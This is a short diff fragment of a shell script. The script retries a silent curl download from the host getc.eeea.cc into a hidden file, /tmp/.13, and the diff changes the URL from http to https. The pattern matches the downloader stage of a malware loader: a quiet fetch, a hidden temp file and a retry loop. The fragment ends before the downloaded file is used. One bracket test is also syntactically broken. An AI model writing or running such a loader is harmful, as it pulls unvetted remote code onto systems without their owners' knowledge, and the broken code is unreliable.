@@ -3,7 +3,7 @@ c=' -4fsL --connect-timeout 3 -m 15 --retry 0 '
 
 i=0
 while :; do
-    curl $c -o /tmp/.13 "http://getc.eeea.cc/c"
+    curl $c -o /tmp/.13 "https://getc.eeea.cc/c"
     [ $? -eq 0 ] && break
     i=$(expr $i + 1)
     if [$i -gt 50]; then
